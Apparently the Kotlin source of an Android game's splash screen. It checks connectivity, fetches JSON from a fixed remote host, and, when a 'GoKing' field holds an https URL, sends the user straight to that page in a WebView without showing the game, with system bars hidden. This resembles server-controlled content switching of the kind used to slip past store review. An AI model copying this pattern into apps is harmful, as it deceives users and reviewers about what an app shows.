package com.kett.bing

import android.annotation.SuppressLint
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.View
import android.view.WindowManager
import android.webkit.WebView
import android.widget.ImageView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.WindowCompat
import com.kett.bing.ui.LoadingFragment
import okhttp3.*
import org.json.JSONObject
import java.io.IOException
import java.lang.StrictMath.log
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.TimeUnit

class SplashActivity : AppCompatActivity() {

    private lateinit var bannerView: ImageView
    private val prefs by lazy {
        getSharedPreferences("banner_prefs", MODE_PRIVATE)
    }

    private lateinit var clickBlocker: View

    private val handler = Handler(Looper.getMainLooper())
    private var isActive = false

    private val client = OkHttpClient.Builder()
        .callTimeout(10, TimeUnit.SECONDS)
        .build()

    override fun onCreate(savedInstanceState: Bundle?) {
        setTheme(R.style.Theme_KettBing_Splash)
        super.onCreate(savedInstanceState)

        setContentView(R.layout.activity_splash)
        warmUpWebView()

        if (savedInstanceState == null) {
            supportFragmentManager.beginTransaction()
                .replace(R.id.loadingFragmentContainer, LoadingFragment())
                .commit()
        }

        bannerView = findViewById(R.id.bannerImageView)
        clickBlocker = findViewById(R.id.clickBlocker)
        clickBlocker.visibility = View.VISIBLE

        hideSystemUI()

        checkConnectionAndLoadBanner()
    }

    @SuppressLint("InlinedApi", "WrongConstant")
    private fun hideSystemUI() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            val controller = WindowCompat.getInsetsController(window, window.decorView)
            controller?.hide(
                android.view.WindowInsets.Type.statusBars() or android.view.WindowInsets.Type.navigationBars()
            )
            controller?.systemBarsBehavior =
                android.view.WindowInsetsController.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
        } else {
            @Suppress("DEPRECATION")
            window.decorView.systemUiVisibility = (
                    View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                            or View.SYSTEM_UI_FLAG_FULLSCREEN
                            or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                            or View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                            or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                            or View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                    )
            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.P) {
                window.setFlags(
                    WindowManager.LayoutParams.FLAG_FULLSCREEN,
                    WindowManager.LayoutParams.FLAG_FULLSCREEN
                )
                window.setFlags(
                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
                )
            }
        }
    }

    private fun checkConnectionAndLoadBanner() {
        Thread {
            val hasInternet = checkInternetAccess()
            runOnUiThread {
                if (hasInternet) {
                    fetchBanner()
                } else {
                    goToMain()
                }
            }
        }.start()
    }

    private fun checkInternetAccess(): Boolean {
        return try {
            val url = URL("https://clients3.google.com/generate_204")
            val conn = url.openConnection() as HttpURLConnection
            conn.setRequestProperty("User-Agent", "Android")
            conn.setRequestProperty("Connection", "close")
            conn.connectTimeout = 1500
            conn.readTimeout = 1500
            conn.connect()
            conn.responseCode == 204
        } catch (e: Exception) {
            false
        }
    }

    private fun fetchBanner() {
        val request = Request.Builder()
            .url("https://bedkingthegame.com/kingScreen")
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                goToMain()
            }

            override fun onResponse(call: Call, response: Response) {
                val body = response.body?.string()
                if (!isActive || isFinishing || isDestroyed) return

                if (body != null) {
                    prefs.edit().putString("banner_json", body).apply()
                    runOnUiThread {
                        if (!isActive || isFinishing || isDestroyed) return@runOnUiThread
                        showBanner(JSONObject(body))
                    }
                } else {
                    runOnUiThread {
                        if (!isActive || isFinishing || isDestroyed) return@runOnUiThread
                        goToMain()
                    }
                }
            }
        })
    }

    private fun warmUpWebView() {
        val context = applicationContext
        WebView(context).apply {
            settings.javaScriptEnabled = true
            loadDataWithBaseURL(null, "<html></html>", "text/html", "UTF-8", null)
        }
    }

    private fun showBanner(json: JSONObject) {
        val action = json.optString("GoKing", null)

        if (action?.startsWith("https://") == true) {
            // Переход сразу в WebView, без отображения баннера
            runOnUiThread {
                if (!isActive || isFinishing || isDestroyed) return@runOnUiThread
                clickBlocker.visibility = View.GONE
                val intent = Intent(this@SplashActivity, BannerWebActivity::class.java)
                intent.putExtra("url", action)
                startActivity(intent)
                overridePendingTransition(android.R.anim.fade_in, android.R.anim.fade_out)
                finish()
            }
        } else {
            // Если URL некорректен — просто запускаем основное активити
            runOnUiThread {
                goToMain()
            }
        }
    }

    private fun goToMain() {
        clickBlocker.visibility = View.GONE
        startActivity(Intent(this, MainActivity::class.java))
        finish()
    }

    override fun onStart() {
        super.onStart()
        isActive = true
    }

    override fun onStop() {
        super.onStop()
        isActive = false
    }

    override fun onDestroy() {
        super.onDestroy()
        isActive = false
    }

    override fun onResume() {
        super.onResume()
        hideSystemUI()
    }
}

